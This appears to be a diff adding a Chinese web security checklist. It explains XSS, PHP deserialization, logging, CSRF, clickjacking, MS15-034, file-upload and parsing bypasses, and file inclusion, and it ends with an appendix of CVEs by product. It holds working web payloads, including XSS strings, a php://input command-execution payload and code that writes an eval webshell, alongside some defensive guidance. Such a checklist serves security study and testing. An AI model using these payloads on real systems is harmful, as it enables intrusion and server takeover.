+<li>4） 盗取网站用户信息：当能够窃取到用户Cookie从而获取到用户身份使，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。</li>
+<li>5） 垃圾信息发送：比如在SNS社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</li>
+<li>6） 劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，监视用户的浏览历史，发送与接收的数据等等。</li>
+<li>7） XSS蠕虫：XSS 蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施DDoS攻击等。</li>
+</ul>
+<p>常用payload：</p>
+<pre><code>&lt;script&gt;prompt()&lt;/script&gt;
+&lt;img src=1 onmouseover=&quot;alert()&quot;/&gt;
+&lt;input type=1 onmouseover=&quot;alert()&quot;/&gt;
+&lt;svg onload=confirm()&gt;
+&lt;iframe src=&quot;javascript:alert()&quot;&gt;&lt;/iframe&gt;</code></pre><p><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">https://xz.aliyun.com/t/2936</a><br><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/153055.html</a><br><a href="https://www.freebuf.com/articles/web/81959.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/81959.html</a></p>
+<h2 id="0x80-不安全的反序列化"><a href="#0x80-不安全的反序列化" class="headerlink" title="0x80 不安全的反序列化"></a>0x80 不安全的反序列化</h2><p>原理：</p>
+<ul>
+<li>序列化：把对象转化成字节序列的过程，用于对象的传输和持久化（保存到文件或数据库），同时保留其类型和结构。</li>
+<li>反序列化：把字节序列转换成对象的过程。</li>
+<li>为何使用序列化：两进程在远程通信时，互相发送各类型的数据（图片、视频、文字等），这些数据都以二进制的形式在网络上传输。</li>
+</ul>
+<p>描述：</p>
+<ul>
+<li>序列户和反序列化本身不存在问题，问题是当输入的反序列化的数据可被用户控制，就可能存在被输入恶意构造的攻击代码，让反序列化产生非预期的对象，在过程中执行了恶意代码。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>任意文件读取、代码执行</li>
+</ul>
+<ol>
+<li>weblogic 漏洞</li>
+<li>fastjson 漏洞</li>
+<li>shiro 漏洞</li>
+<li>Jboss 漏洞</li>
+<li>…</li>
+</ol>
+<p>PHP反序列化、JAVA反序列化</p>
+<ul>
+<li>public属性：正常变量名</li>
+<li>protected属性：变量名前加上%00*%00</li>
+<li>private属性：变量名前加上%00类名%00</li>
+</ul>
+<p>例子：</p>
+<pre><code>&lt;?php 
+    class SS{
+        public $user;
+        private $pass;
+        protected $code;
+
+        public function __construct($user,$pass,$code){
+            $this-&gt;user=$user;
+            $this-&gt;pass=$pass;
+            $this-&gt;code=$code;
+        }
+    }
+
+    $number=123;
+    $str=&#39;string123&#39;;
+    $bool=true;
+    $null=NULL;
+    $arr=array(&#39;a&#39;=&gt;1,&#39;bc&#39;=&gt;23);
+    $ss=new SS(&#39;admin&#39;,&#39;123456&#39;,&#39;0000&#39;);
+
+var_dump(serialize($number));
+var_dump(serialize($str));
+var_dump(serialize($bool));
+var_dump(serialize($null));
+var_dump(serialize($arr));
+var_dump(serialize($ss));
+?&gt;
+
+string(6) &quot;i:123;&quot;
+string(16) &quot;s:9:&quot;string123&quot;;&quot;
+string(4) &quot;b:1;&quot;
+string(2) &quot;N;&quot;
+string(32) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:2:&quot;bc&quot;;i:23;}&quot;
+string(89) &quot;O:2:&quot;SS&quot;:3:{s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:8:&quot; SS pass&quot;;s:6:&quot;123456&quot;;s:7:&quot; * code&quot;;s:4:&quot;0000&quot;;}&quot;
+
+i：整数
+s：字符串
+b：布尔类型
+N：null
+a：数组
+O：对象
+2：类名SS长度
+SS：类名
+3：变量数量
+s：字符串
+4：变量名长度
+s：字符串
+5：长度
+admin：值</code></pre><h2 id="0x90-使用含有已知漏洞的组件"><a href="#0x90-使用含有已知漏洞的组件" class="headerlink" title="0x90 使用含有已知漏洞的组件"></a>0x90 使用含有已知漏洞的组件</h2><p>描述：</p>
+<ul>
+<li>服务器或多或少使用各种组件，管理员不能保证所有使用的组件都能及时更新到最新。所有可能会存在部分组件未及时更新而存在已知的漏洞。攻击者可能使用这些已知的漏洞来攻击，甚至获得管理员权限。</li>
+</ul>
+<p>防御：</p>
+<ul>
+<li>移除不再使用或不需要的组件、功能、文件和文档</li>
+<li>平时养成安全意识，只从官方渠道获取安全的安装包或更新补丁，并使用签名机制来降低组件被篡改或被加入恶意漏洞的风险。</li>
+<li>关注官网最新的漏洞报告，及时为正在使用的组件升级或离线打补丁。</li>
+</ul>
+<p><a href="#附录0x01">附录0x01</a></p>
+<h2 id="0xA0-不足的日志记录和监控"><a href="#0xA0-不足的日志记录和监控" class="headerlink" title="0xA0 不足的日志记录和监控"></a>0xA0 不足的日志记录和监控</h2><p>描述：</p>
+<ul>
+<li>不足的日志记录和监控可能造成被入侵却可能无法及时发现、无法找到漏洞根源、无法及时修补漏洞，无法做出相应的防御，攻击者达成攻击目的而不被知晓。</li>
+</ul>
+<p>防御：</p>
+<ul>
+<li>确保日志记录登录成功的日志、登录失败的日志、请求用户的源IP、源端口、相关请求报文、请求时间、请求路径、响应码、包大小等等，并保留足够的用户上下文信息，以识别可疑或恶意用户，为后期取证预留足够时间。</li>
+<li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。</li>
+<li>完善日志系统，使其可以监控各种日志信息</li>
+<li>及时对日志系统进行备份，并保存足够长时间。</li>
+</ul>
+<h3 id="0xA1-各种日志"><a href="#0xA1-各种日志" class="headerlink" title="0xA1 各种日志"></a>0xA1 各种日志</h3><p><strong>系统日志</strong></p>
+<ol>
+<li><ul>
+<li>windows——控制面板——系统和安全——管理工具——事件查看器——windows日志——应用程序、安全、setup、系统等</li>
+</ul>
+</li>
+<li><ul>
+<li>win+R（运行）——eventvwr.exe——windows日志——应用程序、安全、setup、系统等</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>Linux</li>
+<li><ul>
+<li>/var/log/boot.log 一般包含系统启动时的日志，包括自启动的服务。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/btmp 记录所有失败登录信息。非文本文件，可以使用last -f /var/log/btmp进行查看。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/cron cron计划任务的日志，每当cron任务被执行的时候都会在这个文件里面记录。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/dmesg 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以直接查看这个文件或者使用dmesg这个命令查看。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/lastlog 记录所有用户的最近信息。非文本文件，可以使用lastlog进行查看。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/maillog 包含来着系统运行电子邮件服务器的日志信息。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/message 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/secure 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/yum.log 包含使用yum安装软件包的信息。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/anaconda/ 目录 或者 /var/log/anconda.log 包含在安装CentOS/RHEL时候的日志。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/audit目录 包含audit daemon的审计日志。例如：selinux开启的时候，这里就会有关于selinux审计的日志。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/sa/ 目录 包含每日由sysstat软件包收集的sar文件。</li>
+</ul>
+</li>
+<li><ul>
+<li>/var/log/cups 涉及所有打印信息的日志，即cups打印服务运行的日志。</li>
+</ul>
+</li>
+</ol>
+<p><strong>应用日志</strong><br>windows apache日志</p>
+<ol>
+<li>/conf/httpd.conf 配置文件</li>
+<li>CustomLog “logs/access.log” common #这是保存日志目录及文件，默认在logs目录下，日志文件名为access.log</li>
+<li>在上面的<code>LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common</code> #这是保存的日志内容</li>
+<li><img src="/Web-CheckList/Apache%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt></li>
+</ol>
+<p>windows tomcat日志<br>windows nginx日志<br>windows IIS日志<br>windows PHP日志 </p>
+<ul>
+<li><a href="https://www.cnblogs.com/caicaizi/p/6812010.html" target="_blank" rel="noopener">https://www.cnblogs.com/caicaizi/p/6812010.html</a> </li>
+<li><a href="https://www.jb51.net/article/68290.htm" target="_blank" rel="noopener">https://www.jb51.net/article/68290.htm</a></li>
+</ul>
+<p>linux apache</p>
+<ol>
+<li>/var/log/apache2/、/etc/httpd/logs/、/var/log/httpd/</li>
+</ol>
+<p>linux tomcat<br>linux nginx<br><a href="https://www.freebuf.com/articles/network/175563.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/175563.html</a><br><a href="https://www.freebuf.com/articles/web/209936.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/209936.html</a></p>
+<p><strong>web日志分析脚本</strong><br><a href="#附录0x02">Linux服务器web日志分析脚本</a><br><a href="https://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/126698.html</a><br><a href="https://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/110644.html</a></p>
+<p><strong>数据库日志</strong></p>
+<ul>
+<li>mysql <a href="https://blog.csdn.net/xuheng8600/article/details/79823875" target="_blank" rel="noopener">https://blog.csdn.net/xuheng8600/article/details/79823875</a></li>
+<li>mssql</li>
+<li>oracle</li>
+</ul>
+<h2 id="0xB0-其他1"><a href="#0xB0-其他1" class="headerlink" title="0xB0 其他1"></a>0xB0 其他1</h2><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>描述：</p>
+<ul>
+<li>浏览器发送会话cookie记录当前用户的认证凭证，导致攻击者通过发送恶意的web页面给受害者，受害者访问后发送伪造的恶意请求，浏览器很难区分出恶意请求还是合法请求。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>攻击者可能让用户执行用户允许的操作或修改任何用户可修改的数据（修改密码等）。</li>
+</ul>
+<h3 id="Flash点击劫持"><a href="#Flash点击劫持" class="headerlink" title="Flash点击劫持"></a>Flash点击劫持</h3><p>描述：</p>
+<ul>
+<li>点击劫持(ClickJacking)，又称“UI-覆盖攻击”，通过覆盖不可见的框架误导受害者进行点击而造成的攻击行为。其本质是一种视觉欺骗。</li>
+</ul>
+<p>防御：</p>
+<ul>
+<li>使用一个HTTP头——X-Frame-Options。X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：</li>
+<li>DENY：浏览器会拒绝当前页面加载任何frame页面；</li>
+<li>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</li>
+<li>ALLOW-FROM origin：允许frame加载的页面地址；</li>
+</ul>
+<p>Apache配置：<br><code>Header always append X-Frame-Options SAMEORIGIN</code></p>
+<p>nginx配置：<br><code>add_header X-Frame-Options SAMEORIGIN;</code></p>
+<p>IIS配置：</p>
+<pre><code>&lt;system.webServer&gt;
+    ...
+    &lt;httpProtocol&gt;
+        &lt;customHeaders&gt;
+            &lt;add name=&quot;X-Frame-Options&quot; value=&quot;SAMEORIGIN&quot; /&gt;
+        &lt;/customHeaders&gt;
+    &lt;/httpProtocol&gt;
+    ...
+&lt;/system.webServer&gt;</code></pre><p><a href="https://www.cnblogs.com/lovesong/p/5248483.html" target="_blank" rel="noopener">https://www.cnblogs.com/lovesong/p/5248483.html</a></p>
+<h3 id="Flash跨域漏洞"><a href="#Flash跨域漏洞" class="headerlink" title="Flash跨域漏洞"></a>Flash跨域漏洞</h3><p><a href="https://bbs.ichunqiu.com/thread-43011-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43011-1-1.html</a></p>
+<h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p><code>index.php?id=1&amp;id=a</code><br><img src="/Web-CheckList/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.png" alt></p>
+<h3 id="HTTP-sys远程代码执行漏洞（CVE-2015-1635-MS15-034）"><a href="#HTTP-sys远程代码执行漏洞（CVE-2015-1635-MS15-034）" class="headerlink" title="HTTP.sys远程代码执行漏洞（CVE-2015-1635 MS15-034）"></a>HTTP.sys远程代码执行漏洞（CVE-2015-1635 MS15-034）</h3><p>描述：</p>
+<ul>
+<li>Http.sys是Microsoft Windows处理HTTP请求的内核驱动程序。HTTP.sys会错误解析某些特殊构造的HTTP请求，导致远程代码执行漏洞。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>利用此漏洞后，攻击者可在System帐户上下文中执行任意代码。由于此漏洞存在于内核驱动程序中，攻击者也可以远程导致操作系统蓝屏。</li>
+</ul>
+<p><strong>POC：</strong></p>
+<ul>
+<li>header中添加：<code>Range: bytes=0-18446744073709551615</code> </li>
+<li>响应 416 Requested Range Not Satisfiable #说明漏洞存在</li>
+<li>MSF：<code>search ms15-034</code></li>
+<li>curl -v domain/IP -H “Range: bytes=0-18446744073709551615”</li>
+</ul>
+<p>修复：</p>
+<ul>
+<li><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034" target="_blank" rel="noopener">打补丁</a></li>
+<li>IIS-功能视图-输出缓存-操作-编辑功能设置-启用内核缓存，取消勾选。</li>
+</ul>
+<h3 id="IIS短文件名泄露漏洞"><a href="#IIS短文件名泄露漏洞" class="headerlink" title="IIS短文件名泄露漏洞"></a>IIS短文件名泄露漏洞</h3><p>描述：</p>
+<ul>
+<li>Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。</li>
+</ul>
+<p>漏洞成因：</p>
+<ul>
+<li>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</li>
+</ul>
+<p>windows下查看短文件名命令：dir /x</p>
+<p><strong>例子：</strong></p>
+<ol>
+<li>存在<a href="http://www.test.com.2020backup.sql文件，短文件名为WWWTES~1.SQL，只要爆破出WWWTES~1.SQL即可下载，无需爆破全名。" target="_blank" rel="noopener">www.test.com.2020backup.sql文件，短文件名为WWWTES~1.SQL，只要爆破出WWWTES~1.SQL即可下载，无需爆破全名。</a></li>
+</ol>
+<p><a href="https://www.freebuf.com/sectool/197144.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/197144.html</a></p>
+<h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><h3 id="文件上传漏洞一（针对图片）"><a href="#文件上传漏洞一（针对图片）" class="headerlink" title="文件上传漏洞一（针对图片）"></a>文件上传漏洞一（针对图片）</h3><ol>
+<li>客户端javascript检测：F12删除检测事件或修改检测类型，上传合法后缀名文件，burpsuite抓包改</li>
+<li>服务端MIME类型检测：抓包改，image/gif、image/jpeg、image/png</li>
+<li>文件扩展名检测：黑名单绕过、大小写绕过、双扩展名嵌套绕过、windows特殊文件名绕过（点、空格）、00截断</li>
+<li><ul>
+<li>php：php3/php4/php5/pht/phtml</li>
+</ul>
+</li>
+<li><ul>
+<li>jsp：jspx/jspf</li>
+</ul>
+</li>
+<li><ul>
+<li>asp：asa/cer/aspx/cdx</li>
+</ul>
+</li>
+<li><ul>
+<li>exe：</li>
+</ul>
+</li>
+<li>文件头检测：47 49 46 38 39 61(GIF89a)/89 50 4E 47/FF D8 FF E0 00 10 4A 46 49 46</li>
+<li>文件内容检测：图片马</li>
+<li>文件二次渲染：GD库找图片未改变的部分</li>
+<li>文件被重命名：条件竞争绕过</li>
+</ol>
+<h3 id="文件上传漏洞二-web-config"><a href="#文件上传漏洞二-web-config" class="headerlink" title="文件上传漏洞二 web.config"></a>文件上传漏洞二 web.config</h3><p><strong>web.config</strong></p>
+<ul>
+<li>web.config 文件是一个XML文本文件，用来储存ASP.NET web应用程序的配置信息，可以出现在每个目录中，运行时对web.config文件的修改不需要重启服务即可生效。</li>
+</ul>
+<p><strong>IIS7 上传web.config文件，刷新重定向到百度</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;system.webServer&gt;
+        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;https://www.baidu.com/&quot;/&gt;
+    &lt;/system.webServer&gt;
+&lt;/configuration&gt;</code></pre><p><a href="https://www.jianshu.com/p/ca7ea37bb1c1" target="_blank" rel="noopener">https://www.jianshu.com/p/ca7ea37bb1c1</a></p>
+<h3 id="文件上传漏洞三-htaccess"><a href="#文件上传漏洞三-htaccess" class="headerlink" title="文件上传漏洞三 .htaccess"></a>文件上传漏洞三 .htaccess</h3><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>IIS5.x-6.x解析漏洞</p>
+<ol>
+<li>/xxx.asp/xxx.jpg</li>
+<li>1.asp;.jpg</li>
+<li>1.cer、1.asa、1.cdx</li>
+</ol>
+<p>IIS 7.0/IIS 7.5/Nginx &lt; 8.03</p>
+<ol>
+<li>IIS 7.0/7.5，默认 Fast-CGI 开启，url/1.jpg后加/1.php会解析成php文件</li>
+</ol>
+<p>Nginx空字节漏洞</p>
+<ol>
+<li>影响版本：0.5、0.6、0.7&lt;=0.7.65、0.8&lt;= 0.8.37</li>
+<li>Nginx默认是以CGI的方式支持PHP解析的</li>
+<li>URL/1.jpg%00.php会解析成php文件</li>
+</ol>
+<p>Apache（1.x、2.x）解析漏洞</p>
+<ol>
+<li>1.php.qwe.asd</li>
+</ol>
+<p>windows特性</p>
+<ol>
+<li>抓包，上传1.jpg[空格] 或 1.jpg. 或 1.jpg::$DATA</li>
+</ol>
+<p>.htaccess解释</p>
+<ol>
+<li><code>SetHandler application/x-httpd-php</code></li>
+</ol>
+<p><a href="https://help.aliyun.com/knowledge_detail/37449.html" target="_blank" rel="noopener">FastCGI攻击</a></p>
+<ol>
+<li>Nginx中存在一个较为严重的安全问题，FastCGI模块默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析。</li>
+<li>利用该漏洞，攻击者可以将任意文件类型作为PHP文件解析，攻击者通常利用该漏洞来获取到一个WebShell。</li>
+<li>例子：<code>http://IP/phpinfo.jpg/1.php</code></li>
+</ol>
+<h3 id="本地文件包含漏洞与远程文件包含漏洞"><a href="#本地文件包含漏洞与远程文件包含漏洞" class="headerlink" title="本地文件包含漏洞与远程文件包含漏洞"></a>本地文件包含漏洞与远程文件包含漏洞</h3><p>描述：</p>
+<ul>
+<li>本地文件包含是指程序代码在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的静态文件，或网站日志文件作为代码执行，进而获取到服务器权限，造成网站被恶意删除，用户和交易数据被篡改等一系列恶性后果。</li>
+<li>远程文件包含是指程序代码在处理包含文件的时候没有严格控制。导致用户可以构造参数包含远程代码在服务器上执行，进而获取到服务器权限，造成网站被恶意删除，用户和交易数据被篡改等一系列恶性后果。</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li>攻击者可以利用该漏洞，在服务器上执行命令。</li>
+</ul>
+<p><strong>文件包含函数</strong></p>
+<ul>
+<li>PHP：include()、require()、include_once()、require_once()、fopen()、readfile()</li>
+<li>JSP：java.io.File()、java.io.FileReader()</li>
+<li>asp：include file、include virtual</li>
+</ul>
+<p><strong>例子：</strong></p>
+<pre><code>test.php
+&lt;?php 
+if(!isset($page)&amp;&amp;$page=$_GET[&quot;page&quot;]){
+    include $page;
+}
+
+phpinfo.txt
+&lt;?php phpinfo();
+
+LFI（本地文件包含）：http://127.0.0.1/test.php?page=phpinfo.txt
+RFI（远程文件包含）：http://127.0.0.1/test.php?page=http://1.2.3.4/phpinfo.txt 
+RFI条件：php.ini里，allow_url_fopen=On 和 allow_url_include=On
+</code></pre><p>有限制本地文件包含漏洞</p>
+<pre><code>&lt;?php
+$filename = $_GET[&#39;filename&#39;];
+include($filename.&quot;.html&quot;);
+
+%00截断（magic_quotes_gpc=Off php版本&lt;5.3.4）
+url?filename=../../../../../windows/win.ini%00 #去掉c:
+
+路径长度截断（windows，长度大于256，超出的部分会被丢弃；Linux要大于4096）
+url?file=phpinfo.txt/./././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p>有限制远程文件包含漏洞</p>
+<pre><code>&lt;?php include($_GET[&quot;file&quot;].&quot;.html&quot;);
+url/phpinfo.txt? # ?号绕过
+url/phpinfo.txt%23 # #号绕过
+url/phpinfo.txt%20 # 空格绕过</code></pre><p>文件包含与php伪协议</p>
+<pre><code>&lt;?php include($_GET[&quot;file&quot;]);
+
+url/?file=php://filter/convert.base64-encode/resource=test.txt #只需allow_url_fopen=On
+
+
+开启allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）
+url/?file=php://input
+POST：&lt;?php system(&#39;whoami&#39;);?&gt; #执行命令
+
+POST：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[&quot;cmd&quot;])?&gt;&#39;);?&gt; #burpsuite写入一句话木马</code></pre><p><strong>session文件包含漏洞</strong><br>条件：获取到session的存储位置，如：默认的存储路径，通过phpinfo等等</p>
+<p>php.ini里：session.save_path=”路径”</p>
+<pre><code>&lt;?php
+session_start();
+$s=$_GET[&#39;s&#39;];
+$_SESSION[&quot;username&quot;]=$s;
+</code></pre><p>访问<code>url/?s=123qwe</code>，就会在储存目录下保存一个session文件，名：sess_+sessionid，sessionid可通过开发者模式（F12）的cookie值获取，内容为：<code>username|s:6:&quot;123qwe&quot;;</code></p>
+<p>写入恶意代码<code>&lt;?php phpinfo();</code>，再包含<br><code>url/?s=&lt;?php phpinfo();</code></p>
+<h3 id="缓慢的HTTP拒绝服务攻击"><a href="#缓慢的HTTP拒绝服务攻击" class="headerlink" title="缓慢的HTTP拒绝服务攻击"></a>缓慢的HTTP拒绝服务攻击</h3><p>描述：</p>
+<ul>
+<li>缓慢的http拒绝服务攻击是一种专门针对于Web的应用层拒绝服务攻击，攻击者操纵网络上的肉鸡，对目标Web服务器进行海量http request攻击，直到服务器带宽被打满，造成了拒绝服务。</li>
+</ul>
+<p><a href="https://www.cnblogs.com/peterpan0707007/p/7896070.html" target="_blank" rel="noopener">https://www.cnblogs.com/peterpan0707007/p/7896070.html</a></p>
+<h3 id="SSRF服务器请求伪造"><a href="#SSRF服务器请求伪造" class="headerlink" title="SSRF服务器请求伪造"></a>SSRF服务器请求伪造</h3><h2 id="附录0x01-——参考零组资料文库"><a href="#附录0x01-——参考零组资料文库" class="headerlink" title="附录0x01 ——参考零组资料文库"></a><span id="附录0x01">附录0x01</span> ——参考<a href="https://wiki.0-sec.org/#/md" target="_blank" rel="noopener">零组资料文库</a></h2><pre><code> ActiveMQ
+ ActiveMQ物理路径泄漏漏洞
+ （CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce
+ （CVE-2015-5254）ActiveMQ 反序列化漏洞
+ （CVE-2016-3088）ActiveMQ应用漏洞
+ （CVE-2017-15709）ActiveMQ 信息泄漏漏洞
+ Adminer
+ Adminers 1.1.3 （SQLite 3 写入一句话木马）
+ （CVE-2018-7667）Adminer服务器端请求伪造漏洞
+ Adminer 任意文件读取漏洞
+ Adobe ColdFusion
+ （CVE-2010-2861）Adobe ColdFusion 文件读取漏洞
+ （CVE-2017-3066）Adobe ColdFusion 反序列化漏洞
+ Adobe Flash Player
+ Flash钓鱼源码
+ （CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞
+ Aerospike
+ （CVE-2020-13151）Aerospike 数据库主机命令执行漏洞
+ Apache
+ （CVE-2007-6750）Apache ddos
+ （CVE-2017-15715）Apache解析漏洞
+ （CVE-2019-0211）Apache HTTP 服务组件提权漏洞
+ Apache后门维持
+ Apache Airflow
+ （CVE-2019-0216）Apache Airflow 储存型xss
+ （CVE-2020-11978）Apache Airflow 命令注入漏洞
+ Apache Axis
+ （CVE-2019-0227）Apache Axis 1.4远程代码执行
+ Apache Cocoon XML
+ （CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞
+ Apache DolphinScheduler
+ （CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞
+ Apache Dubbo
+ （CVE-2019-17564）Apache Dubbo 反序列化漏洞
+ （CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞
+ Apache Flink
+ Apache Flink Dashboard 未授权访问-远程代码命令执行
+ Apache FusionAuth
+ （CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞
+ Apache HTTPD
+ Apache HTTPD 多后缀解析漏洞
+ （CVE-2017-15715）Apache HTTPD 换行解析漏洞
+ Apache JMeter
+ （CVE-2018-1297）Apache Jmeter RMI 反序列化命令执行漏洞
+ Apache Kylin
+ （CVE-2020-1956）Apache Kylin 远程命令执行漏洞
+ Apache Log4j
+ （CVE-2017-5645）Log4j 2.X反序列化漏洞
+ （CVE-2019-17571）Log4j 1.2.X反序列化漏洞
+ Apache Ofbiz
+ （CVE-2020-9496）Apache Ofbiz 远程命令执行漏洞
+ Apache POI
+ （CVE-2019-12415）Apache POI &lt;= 4.1.0 XXE漏洞
+ Apache ShardingSphere
+ （CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞
+ Apache Shiro
+ （CVE-2016-4437）Apache Shiro &lt;=1.2.4 反序列化漏洞
+ （CVE-2020-1957）Apache Shiro &lt; 1.5.2 身份认证绕过漏洞
+ （CVE-2020-11989）Apache Shiro &lt; 1.5.3 身份认证绕过漏洞
+ （CVE-2020-13933）Apache Shiro &lt; 1.6.0 身份认证绕过漏洞
+ Apache Solr
+ Apache Solr Velocity模版注入远程命令执行
+ （CVE-2017-3163）Apahce Solr 任意文件读取漏洞
+ （CVE-2017-12629）Apache Solr rce&amp;xxe 漏洞
+ （CVE-2017-3164）Apache Solr 服务器端请求伪造漏洞
+ （CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞
+ （CVE-2019-0193）Apache Solr 远程命令执行漏洞
+ （CVE-2019-12409）Apache Solr 远程命令执行漏洞
+ （CVE-2019-17558）Apache Solr 代码注入漏洞
+ （CVE-2020-13957）Apache Solr 未授权访问漏洞
+ Apache SSI
+ Apache SSI 远程命令执行漏洞
+ Apache Spark
+ Apache Spark 未授权访问漏洞
+ Apache Struts
+ Apache Struts 漏洞列表快速查阅
+ （CVE-2007-4556）s2-001
+ （CVE-xxxx-xxxx）s2-002
+ （CVE-2008-6504）S2-003
+ （CVE-2010-1870）s2-005
+ （CVE-2012-0838）s2-007
+ （CVE-2012-0391）s2-008
+ （CVE-2011-3923）s2-009
+ （CVE-2013-1965）s2-012
+ （CVE-2013-1966）s2-013
+ （ CVE-2013-1966）（CVE-2013-2115）S2-014
+ （CVE-2013-2135）（CVE-2013-2134）s2-015
+ （CVE-2013-2251）s2-016
+ （CVE-2013-2248）s2-017
+ （CVE-2013-4316）s2-019
+ （CVE-2016-0785）S2-029
+ （CVE-2016-3081）s2-032
+ （CVE-2016-3087）s2-033
+ （CVE-2016-4438）s2-037
+ （CVE-2016-6795）s2-042
+ （CVE-2017-5638）S2-045
+ （CVE-2017-5638）s2-046
+ （CVE-2017-9791）s2-048
+ （CVE-2017-9805）s2-052
+ （CVE-2017-12611）S2-053
+ （CVE-2017-7525）s2-055
+ （CVE-2018-1327）S2-056
+ （CVE-2018-11776）s2-057
+ （CVE-2019-0230）s2-09
+ Apereo CAS
+ Apereo CAS 4.X execution参数反序列化漏洞
+ AppWeb
+ （CVE-2018-8715）AppWeb认证绕过漏洞
+ Aria2
+ （CVE-2016-3088）Aria2 任意文件写入漏洞
+ Atlassian Jira
+ （CVE-2019-8449）Atlassian Jira 信息泄露漏洞
+ （CVE-2019-8451）Atlassian Jira 未授权SSRF漏洞验证
+ （CVE-2019-11581）Atlassian Jira 远程命令执行漏洞
+ ATutor
+ （CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞
+ BSPHP
+ Cacti
+ （CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞
+ CatfishCMS
+ CatfishCMS后台csrf
+ CatfishCMS后台储存型xss
+ CatfishCMS 4.5.7 xss
+ CatfishCMS 4.5.7 csrf getshell
+ CatfishCMS 4.6.15 前台xss
+ CatfishCMS 4.6.15 后台文件包含getshell
+ CatfishCMS 4.6.15 csrf getshell
+ （CNVD-2019-06255）CatfishCMS远程命令执行
+ Citrix
+ （CVE-2019-19781）Citrix 远程命令执行漏洞
+ （CVE-2020-ianianian）Citrix 目录遍历漏洞
+ （CVE-2020-7473）Citrix 认证绕过getshell
+ （CVE-2020-8194）Citrix 未授权访问导致的任意代码执行漏洞
+ （CVE-2020-8195）Citrix 未授权访问漏洞
+ （CVE-2020-8196）Citrix Nitro API 未授权访问漏洞
+ （CVE-2020-8198）Citrix 储存型xss
+ CLTPHP
+ CLTPHP 5.8 后台任意文件删除漏洞
+ CLTPHP 5.5.3 任意文件上传漏洞
+ CmsEasy
+ CmsEasy 7.3.8 任意文件操作
